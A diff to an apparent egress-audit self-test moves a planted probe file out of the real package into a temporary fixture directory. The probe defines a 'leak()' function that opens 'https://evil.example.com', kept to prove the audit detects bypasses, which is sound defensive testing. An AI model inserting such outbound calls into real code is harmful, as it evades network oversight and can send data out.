@@ -32,19 +32,18 @@ ok(not findings,
    + (f"\n  FOUND {len(findings)}:\n{detail}" if findings else ""))
 
 # The audit must still be capable of finding one, or an empty result proves
-# nothing. Plant a bypass in a temp file inside the tree and confirm it is seen.
-import os
-probe = "driftcore/_audit_selftest_tmp.py"
-with open(probe, "w") as fh:
-    fh.write("import urllib.request\n"
-             "def leak():\n"
-             "    return urllib.request.urlopen('https://evil.example.com')\n")
-try:
-    found = audit_bypasses("driftcore")
+# nothing. Use a separate fixture tree: interrupted probes must not leave
+# deliberately unsafe Python inside the real package for later tests to find.
+from pathlib import Path
+import tempfile
+with tempfile.TemporaryDirectory(prefix="egress-audit-fixture-") as fixture:
+    probe = Path(fixture) / "_audit_selftest_tmp.py"
+    probe.write_text("import urllib.request\n"
+                     "def leak():\n"
+                     "    return urllib.request.urlopen('https://evil.example.com')\n")
+    found = audit_bypasses(fixture)
     ok(any("_audit_selftest_tmp" in p for p, _, _ in found),
        "the audit still detects a planted bypass (an empty result is meaningful)")
-finally:
-    os.remove(probe)
 
 ok(not audit_bypasses("driftcore"), "tree is clean again after the probe")
 
